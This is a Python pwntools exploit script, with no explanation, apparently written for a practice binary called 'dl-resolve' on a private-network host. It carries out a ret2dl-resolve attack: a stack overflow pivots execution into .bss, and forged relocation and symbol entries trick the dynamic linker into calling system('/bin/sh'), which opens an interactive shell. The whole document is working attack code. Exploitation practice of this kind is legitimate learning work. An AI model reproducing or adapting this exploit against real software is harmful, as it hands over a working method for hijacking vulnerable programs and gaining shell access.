from pwn import *

debug = 0
if debug:
    context.log_level = 'debug'
    p = process('./dl-resolve')
else:
    p = remote('192.168.175.156', 10000)

elf = ELF('./dl-resolve')
write_plt = elf.plt['write']
read_plt = elf.plt['read']
write_got = elf.got['write']

vuln = 0x0804844b
bss_addr = 0x804a024
base_stage = bss_addr + 0x400
pop3_ret = 0x8048509
pop_ebp_ret = 0x804850b
leave_ret = 0x80483b8
plt_resolve = 0x8048300

payload1  = 'a' * 0x88 + 'b' * 0x4 + p32(read_plt) + p32(pop3_ret)
payload1 += p32(0) + p32(base_stage) +p32(100) + p32(pop_ebp_ret)
payload1 += p32(base_stage) + p32(leave_ret) 
p.sendline(payload1)

rel_plt = 0x80482b0
dynsym_addr = 0x80481cc
dynstr_addr = 0x804822c
index_offset = (base_stage + 28) - rel_plt
fake_sym = base_stage + 36
align = 0x10 - ((fake_sym - dynsym_addr) % 0x10)   #necessary
fake_sym = fake_sym + align
index_dynsym = (fake_sym - dynsym_addr) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym + 16) - dynstr_addr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'c' * 4 + p32(plt_resolve) + p32(index_offset) + p32(0xdeadbeef)
payload2 += p32(base_stage + 80) + 'e' * 8 + fake_reloc + 'f' *align
payload2 += fake_sym + 'system\x00'
payload2 = payload2.ljust(80, 'a')
payload2 += '/bin/sh\x00'
payload2 = payload2.ljust(100, 'a')

p.send(payload2)

p.interactive()
